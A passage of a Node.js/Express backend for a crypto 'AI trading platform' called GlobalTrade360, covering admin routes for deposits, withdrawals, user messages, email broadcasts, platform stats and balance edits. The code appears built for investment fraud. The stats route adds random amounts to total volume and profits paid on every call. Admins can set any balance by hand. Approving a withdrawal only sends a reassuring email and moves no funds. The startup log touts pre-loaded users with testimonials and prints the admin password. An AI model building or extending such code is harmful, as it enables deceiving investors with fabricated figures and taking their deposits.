          <p style="color: #666; font-size: 12px;">This is an automated notification from ${CONFIG.PLATFORM_NAME}.</p>
        </div>
        `
      );
    });
    
    res.json({
      success: true,
      message: 'Crypto addresses updated and users notified',
      addresses: db.cryptoAddresses
    });
  } catch (error) {
    res.status(500).json({ error: 'Update failed' });
  }
});

// Get deposit requests (admin)
app.get('/api/admin/deposit-requests', verifyAdmin, (req, res) => {
  try {
    const db = readDB();
    res.json({
      success: true,
      requests: db.depositRequests,
      total: db.depositRequests.length
    });
  } catch (error) {
    res.status(500).json({ error: 'Failed to fetch deposit requests' });
  }
});

// Get withdrawal requests (admin)
app.get('/api/admin/withdrawal-requests', verifyAdmin, (req, res) => {
  try {
    const db = readDB();
    res.json({
      success: true,
      requests: db.withdrawalRequests,
      total: db.withdrawalRequests.length
    });
  } catch (error) {
    res.status(500).json({ error: 'Failed to fetch withdrawal requests' });
  }
});

// Approve deposit (admin)
app.post('/api/admin/approve-deposit', verifyAdmin, async (req, res) => {
  try {
    const { requestId } = req.body;
    const db = readDB();
    
    const requestIndex = db.depositRequests.findIndex(r => r.id === requestId);
    if (requestIndex === -1) {
      return res.status(404).json({ error: 'Deposit request not found' });
    }
    
    const request = db.depositRequests[requestIndex];
    const userIndex = db.users.findIndex(u => u.id == request.userId);
    
    if (userIndex === -1) {
      return res.status(404).json({ error: 'User not found' });
    }
    
    // Update user balance
    db.users[userIndex].balance += request.amount;
    db.users[userIndex].totalDeposited += request.amount;
    
    // Add transaction
    const transaction = {
      id: request.id,
      type: 'deposit',
      amount: request.amount,
      status: 'completed',
      date: new Date().toISOString(),
      method: request.cryptoType
    };
    
    db.users[userIndex].transactions.push(transaction);
    
    // Update request status
    db.depositRequests[requestIndex].status = 'approved';
    db.depositRequests[requestIndex].adminAction = 'approved';
    db.depositRequests[requestIndex].adminActionDate = new Date().toISOString();
    
    // Update platform stats
    db.platformStats.totalVolume += request.amount;
    db.platformStats.updatedAt = new Date().toISOString();
    
    writeDB(db);
    
    // Send approval email to user
    await sendEmail(
      request.userEmail,
      'Deposit Approved - Funds Added to Your Account',
      `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; background: #d4edda; border-radius: 10px; border-left: 4px solid #28a745;">
        <h2 style="color: #155724; text-align: center;">✅ Deposit Approved!</h2>
        <div style="background: white; padding: 20px; border-radius: 10px; margin: 20px 0;">
          <h3>Deposit Details</h3>
          <p><strong>Amount:</strong> $${request.amount}</p>
          <p><strong>Cryptocurrency:</strong> ${request.cryptoType.toUpperCase()}</p>
          <p><strong>Status:</strong> Approved & Processed</p>
          <p><strong>Transaction ID:</strong> ${request.id}</p>
          <p><strong>New Balance:</strong> $${db.users[userIndex].balance.toFixed(2)}</p>
        </div>
        <p>Your deposit has been approved and funds have been added to your account.</p>
        <p>You can now start investing and earning profits!</p>
        <div style="text-align: center; margin: 30px 0;">
          <a href="${req.headers.origin}" style="background: #28a745; color: white; padding: 12px 30px; text-decoration: none; border-radius: 5px; font-weight: bold;">Start Investing</a>
        </div>
      </div>
      `
    );
    
    res.json({
      success: true,
      message: 'Deposit approved and funds added to user account',
      newBalance: db.users[userIndex].balance
    });
    
  } catch (error) {
    console.error('Approve deposit error:', error);
    res.status(500).json({ error: 'Approval failed' });
  }
});

// Approve withdrawal (admin)
app.post('/api/admin/approve-withdrawal', verifyAdmin, async (req, res) => {
  try {
    const { requestId } = req.body;
    const db = readDB();
    
    const requestIndex = db.withdrawalRequests.findIndex(r => r.id === requestId);
    if (requestIndex === -1) {
      return res.status(404).json({ error: 'Withdrawal request not found' });
    }
    
    const request = db.withdrawalRequests[requestIndex];
    const userIndex = db.users.findIndex(u => u.id == request.userId);
    
    if (userIndex === -1) {
      return res.status(404).json({ error: 'User not found' });
    }
    
    // Update request status
    db.withdrawalRequests[requestIndex].status = 'approved';
    db.withdrawalRequests[requestIndex].adminAction = 'approved';
    db.withdrawalRequests[requestIndex].adminActionDate = new Date().toISOString();
    
    // Update platform stats
    db.platformStats.totalProfitPaid += request.amount;
    db.platformStats.updatedAt = new Date().toISOString();
    
    writeDB(db);
    
    // Send approval email to user
    await sendEmail(
      request.userEmail,
      'Withdrawal Approved - Processing Started',
      `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; background: #d4edda; border-radius: 10px; border-left: 4px solid #28a745;">
        <h2 style="color: #155724; text-align: center;">✅ Withdrawal Approved!</h2>
        <div style="background: white; padding: 20px; border-radius: 10px; margin: 20px 0;">
          <h3>Withdrawal Details</h3>
          <p><strong>Amount:</strong> $${request.amount}</p>
          <p><strong>Wallet Address:</strong> ${request.walletAddress.substring(0, 20)}...</p>
          <p><strong>Status:</strong> Approved - Processing</p>
          <p><strong>Transaction ID:</strong> ${request.id}</p>
          <p><strong>Processing Time:</strong> 2-24 hours</p>
        </div>
        <p>Your withdrawal request has been approved and is being processed.</p>
        <p>You will receive another notification when the funds are sent to your wallet.</p>
        <div style="text-align: center; margin: 30px 0;">
          <a href="${req.headers.origin}" style="background: #28a745; color: white; padding: 12px 30px; text-decoration: none; border-radius: 5px; font-weight: bold;">View Status</a>
        </div>
      </div>
      `
    );
    
    res.json({
      success: true,
      message: 'Withdrawal approved and processing started'
    });
    
  } catch (error) {
    console.error('Approve withdrawal error:', error);
    res.status(500).json({ error: 'Approval failed' });
  }
});

// Get messages (admin)
app.get('/api/admin/messages', verifyAdmin, (req, res) => {
  try {
    const db = readDB();
    
    // Get messages with user info
    const messagesWithUsers = db.messages.map(msg => {
      const user = db.users.find(u => u.id == msg.userId);
      return {
        ...msg,
        userName: user ? user.name : 'Unknown',
        userEmail: user ? user.email : 'Unknown',
        userPhoto: user ? user.photo : null
      };
    });
    
    res.json({
      success: true,
      messages: messagesWithUsers,
      total: messagesWithUsers.length
    });
  } catch (error) {
    res.status(500).json({ error: 'Failed to fetch messages' });
  }
});

// Send email to user (admin)
app.post('/api/admin/send-email', verifyAdmin, async (req, res) => {
  try {
    const { userId, subject, message } = req.body;
    const db = readDB();
    
    const user = db.users.find(u => u.id == userId);
    if (!user) {
      return res.status(404).json({ error: 'User not found' });
    }
    
    await sendEmail(
      user.email,
      `Message from ${CONFIG.PLATFORM_NAME}: ${subject}`,
      `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; background: #f8f9fa; border-radius: 10px;">
        <h2 style="color: #D4AF37; text-align: center;">Message from ${CONFIG.PLATFORM_NAME}</h2>
        <div style="background: white; padding: 20px; border-radius: 10px; margin: 20px 0; border-left: 4px solid #D4AF37;">
          <h3>${subject}</h3>
          <p>${message.replace(/\n/g, '<br>')}</p>
        </div>
        <p><em>This is an official message from our support team.</em></p>
        <p style="text-align: center; margin-top: 30px;">
          <strong>${CONFIG.PLATFORM_NAME} Support Team</strong><br>
          Email: ${CONFIG.SUPPORT_EMAIL}
        </p>
      </div>
      `
    );
    
    res.json({
      success: true,
      message: `Email sent to ${user.name}`
    });
    
  } catch (error) {
    console.error('Send email error:', error);
    res.status(500).json({ error: 'Failed to send email' });
  }
});

// Broadcast email to all users (admin)
app.post('/api/admin/broadcast', verifyAdmin, async (req, res) => {
  try {
    const { subject, message } = req.body;
    const db = readDB();
    
    // Send to all users
    const emailPromises = db.users.map(user =>
      sendEmail(
        user.email,
        `[Important] ${subject} - ${CONFIG.PLATFORM_NAME}`,
        `
        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; background: #fff3cd; border-radius: 10px; border-left: 4px solid #ffc107;">
          <h2 style="color: #856404;">📢 Important Announcement</h2>
          <div style="background: white; padding: 20px; border-radius: 10px; margin: 20px 0;">
            <h3>${subject}</h3>
            <p>${message.replace(/\n/g, '<br>')}</p>
          </div>
          <p><em>This is an official announcement from ${CONFIG.PLATFORM_NAME}.</em></p>
          <p style="text-align: center; margin-top: 30px;">
            <strong>${CONFIG.PLATFORM_NAME} Team</strong><br>
            For any questions, contact: ${CONFIG.SUPPORT_EMAIL}
          </p>
        </div>
        `
      )
    );
    
    await Promise.all(emailPromises);
    
    res.json({
      success: true,
      message: `Broadcast email sent to ${db.users.length} users`
    });
    
  } catch (error) {
    console.error('Broadcast error:', error);
    res.status(500).json({ error: 'Broadcast failed' });
  }
});

// Get platform stats (admin)
app.get('/api/admin/stats', verifyAdmin, (req, res) => {
  try {
    const db = readDB();
    
    // Calculate active investments
    let activeInvestments = 0;
    db.users.forEach(user => {
      activeInvestments += user.investments.filter(inv => inv.active).length;
    });
    
    // Update stats with some growth
    db.platformStats.activeUsers = db.users.filter(u => u.lastLogin && Date.now() - new Date(u.lastLogin).getTime() < 7 * 24 * 60 * 60 * 1000).length;
    db.platformStats.totalInvestments = activeInvestments;
    db.platformStats.totalVolume += Math.random() * 1000;
    db.platformStats.totalProfitPaid += Math.random() * 500;
    db.platformStats.updatedAt = new Date().toISOString();
    
    writeDB(db);
    
    res.json({
      success: true,
      stats: db.platformStats,
      pendingDeposits: db.depositRequests.filter(r => r.status === 'pending').length,
      pendingWithdrawals: db.withdrawalRequests.filter(r => r.status === 'pending').length,
      unreadMessages: db.messages.filter(m => m.status === 'unread').length
    });
  } catch (error) {
    res.status(500).json({ error: 'Failed to get stats' });
  }
});

// Update user (admin)
app.post('/api/admin/update-user', verifyAdmin, (req, res) => {
  try {
    const { userId, balance, kyc, verified } = req.body;
    const db = readDB();
    
    const userIndex = db.users.findIndex(u => u.id == userId);
    if (userIndex === -1) {
      return res.status(404).json({ error: 'User not found' });
    }
    
    if (balance !== undefined) db.users[userIndex].balance = parseFloat(balance);
    if (kyc !== undefined) db.users[userIndex].kyc = kyc;
    if (verified !== undefined) db.users[userIndex].verified = verified;
    
    writeDB(db);
    
    res.json({
      success: true,
      message: 'User updated successfully',
      user: {
        id: db.users[userIndex].id,
        name: db.users[userIndex].name,
        balance: db.users[userIndex].balance,
        kyc: db.users[userIndex].kyc,
        verified: db.users[userIndex].verified
      }
    });
  } catch (error) {
    res.status(500).json({ error: 'Failed to update user' });
  }
});

// ========== START SERVER ==========
app.listen(PORT, () => {
  console.log('='.repeat(70));
  console.log('🚀 GLOBALTRADE360 - PROFESSIONAL AI TRADING PLATFORM');
  console.log('='.repeat(70));
  console.log(`📍 Server running on port: ${PORT}`);
  console.log(`🌐 URL: http://localhost:${PORT}`);
  console.log(`🔐 Admin Login: ${CONFIG.ADMIN_USERNAME} / ${CONFIG.ADMIN_PASSWORD}`);
  console.log(`📧 Support Email: ${CONFIG.SUPPORT_EMAIL}`);
  console.log(`👥 Pre-loaded Users: 3 (with photos & testimonials)`);
  console.log(`💰 Test User: testuser / Test123! (Balance: $18,200+)`);
  console.log('='.repeat(70));
  console.log('✅ Platform ready! Admin can control ALL users and transactions.');
  console.log('='.repeat(70));
  
  initDatabase();
});
